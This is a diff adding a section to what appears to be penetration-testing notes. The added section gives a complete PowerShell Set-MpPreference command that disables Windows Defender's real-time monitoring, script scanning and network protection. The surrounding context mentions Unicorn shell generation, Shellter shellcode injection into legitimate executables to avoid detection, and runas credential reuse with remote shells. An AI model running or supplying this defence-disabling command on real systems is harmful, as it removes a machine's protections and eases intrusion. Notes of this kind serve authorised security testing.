@@ -50,6 +50,12 @@ Otherwise Unicorn generates great powershell and hta shells that are difficult t
 
 * shelter https://www.shellterproject.com/download/ can inject shellcode into legit 32-Bit Executables and is likely to get not detected
 
+### Disable Windows Defender (needs admin afaik)
+```
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+
+```
+
 ## runas
 
 The tool `runas` can use cached credentials with the `/savecred` option, however it will open a new `cmd.exe` which is a problem with remote shells.
